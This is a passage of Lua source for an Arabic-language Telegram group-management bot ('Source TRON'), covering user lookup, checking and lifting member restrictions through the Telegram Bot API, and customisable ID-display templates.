local grr = '⌁︙نوع الحساب ↫ ❨ '..gr..' ❩\n⌁︙الايدي ↫ ❨ '..res.id_..' ❩\n⌁︙المعرف ↫ ❨ [@'..username..'] ❩\n⌁︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_Abd(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = DevAbd:get(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevAbd:get(TRON..'Abd:GamesNumber'..msg.chat_id_..res.id_) or 0)
if DevAbd:sismember(TRON..'Abd:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevAbd:sismember(TRON..'Abd:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevAbd:sismember(TRON..'Abd:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevAbd:sismember(TRON..'Abd:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevAbd:sismember(TRON..'Abd:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n⌁︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevAbd:sismember(TRON..'Abd:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevAbd:get(TRON..'Abd:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(res.id_,msg.chat_id_) ~= false then
CustomTitle = '\n⌁︙لقبه ↫ '..GetCustomTitle(res.id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙الحساب محذوف', 1, 'md')
return false  end
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙معرفه ↫ [@'..data.username_..']\n⌁︙ايديه ↫ ❨ `'..res.id_..'` ❩\n⌁︙رتبته ↫ '..IdRank(res.id_, msg.chat_id_)..sudobot..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('كشف (%d+)') and ChCheck(msg) or text and text:match('ايدي (%d+)') and ChCheck(msg) then 
local iduser = text:match('كشف (%d+)') or text:match('ايدي (%d+)')  
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙لم يتم التعرف على الحساب', 1, 'md')
return false  
end
local user_msgs = DevAbd:get(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevAbd:get(TRON..'Abd:GamesNumber'..msg.chat_id_..iduser) or 0)
if DevAbd:sismember(TRON..'Abd:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevAbd:sismember(TRON..'Abd:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevAbd:sismember(TRON..'Abd:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevAbd:sismember(TRON..'Abd:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevAbd:sismember(TRON..'Abd:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n⌁︙القيود ↫ '..Tkeed
else 
Tked = '' 
end
if DevAbd:sismember(TRON..'Abd:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\n⌁︙عدد الكروبات ↫ '..(DevAbd:get(TRON..'Abd:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(iduser,msg.chat_id_) ~= false then
CustomTitle = '\n⌁︙لقبه ↫ '..GetCustomTitle(iduser,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '⌁︙اسمه ↫ ['..data.first_name_..'](tg://user?id='..iduser..')\n⌁︙ايديه ↫ ❨ `'..iduser..'` ❩\n⌁︙رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..sudobot..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙معرفه ↫ [@'..data.username_..']\n⌁︙ايديه ↫ ❨ `'..iduser..'` ❩\n⌁︙رتبته ↫ '..IdRank(data.id_, msg.chat_id_)..sudobot..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgs(user_msgs)..CustomTitle..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩'..Tked, 1, 'md')
end
end,nil)
return false 
end 
--     Source TRON     --
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
if DevAbd:sismember(TRON..'Abd:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevAbd:sismember(TRON..'Abd:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevAbd:sismember(TRON..'Abd:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevAbd:sismember(TRON..'Abd:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevAbd:sismember(TRON..'Abd:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الحظر العام ↫ '..banall..'\n⌁︙الكتم العام ↫ '..muteall..'\n⌁︙الحظر ↫ '..banned..'\n⌁︙الكتم ↫ '..muted..'\n⌁︙التقيد ↫ '..tkeed, 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and Admin(msg) and ChCheck(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if DevAbd:sismember(TRON..'Abd:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevAbd:sismember(TRON..'Abd:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevAbd:sismember(TRON..'Abd:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevAbd:sismember(TRON..'Abd:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevAbd:sismember(TRON..'Abd:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙الحظر العام ↫ '..banall..'\n⌁︙الكتم العام ↫ '..muteall..'\n⌁︙الحظر ↫ '..banned..'\n⌁︙الكتم ↫ '..muted..'\n⌁︙التقيد ↫ '..tkeed, 1, 'md')  
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(TRON) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbd:srem(TRON..'Abd:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevAbd:srem(TRON..'Abd:Ban:'..msg.chat_id_,result.sender_user_id_) DevAbd:srem(TRON..'Abd:Muted:'..msg.chat_id_,result.sender_user_id_) DevAbd:srem(TRON..'Abd:BanAll:',result.sender_user_id_) DevAbd:srem(TRON..'Abd:MuteAll:',result.sender_user_id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbd:srem(TRON..'Abd:Tkeed:'..msg.chat_id_,result.sender_user_id_) DevAbd:srem(TRON..'Abd:Ban:'..msg.chat_id_,result.sender_user_id_) DevAbd:srem(TRON..'Abd:Muted:'..msg.chat_id_,result.sender_user_id_) 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and Admin(msg) and ChCheck(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(TRON) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,user,"Reply","⌁︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbd:srem(TRON..'Abd:Tkeed:'..msg.chat_id_,user) DevAbd:srem(TRON..'Abd:Ban:'..msg.chat_id_,user) DevAbd:srem(TRON..'Abd:Muted:'..msg.chat_id_,user) DevAbd:srem(TRON..'Abd:BanAll:',user) DevAbd:srem(TRON..'Abd:MuteAll:',user)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbd:srem(TRON..'Abd:Tkeed:'..msg.chat_id_,user) DevAbd:srem(TRON..'Abd:Ban:'..msg.chat_id_,user) DevAbd:srem(TRON..'Abd:Muted:'..msg.chat_id_,user) 
end  
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and Admin(msg) and ChCheck(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙هذا معرف قناة وليس معرف حساب', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(TRON) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙انا البوت وليس لدي قيود', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لم استطع استخراج المعلومات', 1, 'md') 
return false  
end
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفع قيوده") 
if SecondSudo(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbd:srem(TRON..'Abd:Tkeed:'..msg.chat_id_,result.id_) DevAbd:srem(TRON..'Abd:Ban:'..msg.chat_id_,result.id_) DevAbd:srem(TRON..'Abd:Muted:'..msg.chat_id_,result.id_) DevAbd:srem(TRON..'Abd:BanAll:',result.id_) DevAbd:srem(TRON..'Abd:MuteAll:',result.id_)
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbd:srem(TRON..'Abd:Tkeed:'..msg.chat_id_,result.id_) DevAbd:srem(TRON..'Abd:Ban:'..msg.chat_id_,result.id_) DevAbd:srem(TRON..'Abd:Muted:'..msg.chat_id_,result.id_) 
end
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     Source TRON     --
if Manager(msg) then
if text and text:match("^تغيير الايدي$") and ChCheck(msg) or text and text:match("^تغير الايدي$") and ChCheck(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂?? 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂️ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 : #stast 
𓄼🇮🇶 𝒊𝒅 : #id 
𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 : #game 
𓄼🇮🇶 𝑴𝒔𝒈𝒔 : #msgs
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
⌁︙𝐔𝐒𝐄𝐑 ↬ #username 
⌁︙𝐈𝐃 ↬ #id
⌁︙𝐒𝐓𝐀𝐒𝐓 ↬ #stast
⌁︙𝐀𝐔𝐓𝐎 ↬ #cont 
⌁︙𝐌𝐀𝐒𝐆 ↬ #msgs
⌁︙𝐆𝐀𝐌𝐄 ↬ #game
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇺🇸 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇺🇸 ꙰
ᯓ 𝗜𝗗 . #id 🇺🇸 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇺🇸 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➥• #username .
- ᴍѕɢѕ ➥• #msgs .
- ѕᴛᴀᴛѕ ➥• #stast .
- ʏᴏᴜʀ ɪᴅ ➥• #id  .
- ᴇᴅɪᴛ ᴍsɢ ➥• #edit .
- ᴅᴇᴛᴀɪʟs ➥• #auto . 
- ɢᴀᴍᴇ ➥• #game .
]]}
local Text_Rand = List[math.random(#List)]
DevAbd:set(TRON.."Abd:GpIds:Text"..msg.chat_id_,Text_Rand)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم تغير كليشة الايدي")  
end
--     Source TRON     --
if SecondSudo(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙رجائا اتبع التعليمات للتعيين \n⌁︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
DevAbd:set("TRON:New:id:"..TRON..msg.sender_user_id_,'TRONTEAM')
return "TRONTEAM"
end
if text and DevAbd:get("TRON:New:id:"..TRON..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevAbd:del("TRON:New:id:"..TRON..msg.sender_user_id_)
return false
end
DevAbd:del("TRON:New:id:"..TRON..msg.sender_user_id_)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevAbd:set(TRON.."Abd:AllIds:Text",text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف كليشة الايدي العامه")  
DevAbd:del(TRON.."Abd:AllIds:Text")
end
end
--     Source TRON     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙رجائا اتبع التعليمات للتعيين \n⌁︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ لطبع المعرف\n `#id` ↬ لطبع الايدي \n `#photos` ↬ لطبع عدد الصور \n `#stast` ↬ لطبع الرتب \n `#msgs` ↬ لطبع عدد الرسائل \n `#msgday` ↬ لطبع الرسائل اليوميه \n `#CustomTitle` ↬ لطبع اللقب \n `#bio` ↬ لطبع البايو \n `#auto` ↬ لطبع التفاعل \n `#game` ↬ لطبع عدد النقاط \n `#cont` ↬ لطبع عدد الجهات \n `#edit` ↬ لطبع عدد السحكات \n `#Description` ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
DevAbd:set("TRON:New:id:"..TRON..msg.chat_id_..msg.sender_user_id_,'TRONTEAM')
return "TRONTEAM"
end
if text and Manager(msg) and DevAbd:get("TRON:New:id:"..TRON..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevAbd:del("TRON:New:id:"..TRON..msg.chat_id_..msg.sender_user_id_)
return false
end
DevAbd:del("TRON:New:id:"..TRON..msg.chat_id_..msg.sender_user_id_)
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الكليشه الجديده', 1, 'md')
DevAbd:set(TRON.."Abd:GpIds:Text"..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف كليشة الايدي")  
DevAbd:del(TRON.."Abd:GpIds:Text"..msg.chat_id_)
end
end
--     Source TRON     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function TRONTEAM(extra,abbas,success)
if abbas.username_ then username = '@'..abbas.username_ else username = 'لا يوجد' end
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) ~= false then CustomTitle = GetCustomTitle(msg.sender_user_id_,msg.chat_id_) else CustomTitle = 'لا يوجد' end
local function getpro(extra, abbas, success) 
local msgsday = DevAbd:get(TRON..'Abd:UsersMsgs'..TRON..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevAbd:get(TRON..'Abd:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbd:get(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local user_nkt = tonumber(DevAbd:get(TRON..'Abd:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevAbd:get(TRON..'Abd:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevAbd:get(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local Texting = {"مو صوره ظيم بالنبي ،🤤💞","مقتنع بصورتك !؟ 😹🖤","ملاك وناسيك بكروبنه ،🤤💞","وفالله ،🤤💞","كشخه برب ،😉🤍","لزكت بيها دغيرها عاد ،😒😕","صورتك مامرتاحلها ،🙄😶","حلغوم والله ،🥺💘","مو صوره غنبله براسها ٦٠ حظ ،😹🤍"}
local Description = Texting[math.random(#Texting)]
if abbas.photos_[0] then
if not DevAbd:get(TRON..'Abd:Lock:Id'..msg.chat_id_) then 
if not DevAbd:get(TRON..'Abd:Lock:Id:Photo'..msg.chat_id_) then 
if DevAbd:get(TRON.."Abd:AllIds:Text") then
newpicid = DevAbd:get(TRON.."Abd:AllIds:Text")
newpicid = newpicid:gsub('#username',(username or 'لا يوجد'))
newpicid = newpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newpicid = newpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'لا يوجد'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
newpicid = newpicid:gsub('#cont',(cont or 'لا يوجد'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newpicid = newpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newpicid = newpicid:gsub('#Description',(Description or 'لا يوجد'))
else
newpicid = "⌁︙"..Description.."\n⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end 
if not DevAbd:get(TRON.."Abd:GpIds:Text"..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevAbd:get(TRON.."Abd:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(abbas.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, abbas.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if DevAbd:get(TRON.."Abd:AllIds:Text") then
newallid = DevAbd:get(TRON.."Abd:AllIds:Text")
newallid = newallid:gsub('#username',(username or 'لا يوجد'))
newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newallid = newallid:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
newallid = newallid:gsub('#game',(user_nkt or 'لا يوجد'))
newallid = newallid:gsub('#edit',(edit_msg or 'لا يوجد'))
newallid = newallid:gsub('#cont',(cont or 'لا يوجد'))
newallid = newallid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newallid = newallid:gsub('#msgday',(msgsday or 'لا يوجد'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newallid = newallid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newallid = newallid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newallid = newallid:gsub('#Description',(Description or 'لا يوجد'))
else
newallid = "⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙سحكاتك ↫ ❨ "..edit_msg.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩"
end 
if not DevAbd:get(TRON.."Abd:GpIds:Text"..msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = DevAbd:get(TRON.."Abd:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(abbas.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
Dev_Abd(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الايدي معطل ', 1, 'md')
end
else
if DevAbd:get(TRON.."Abd:AllIds:Text") then
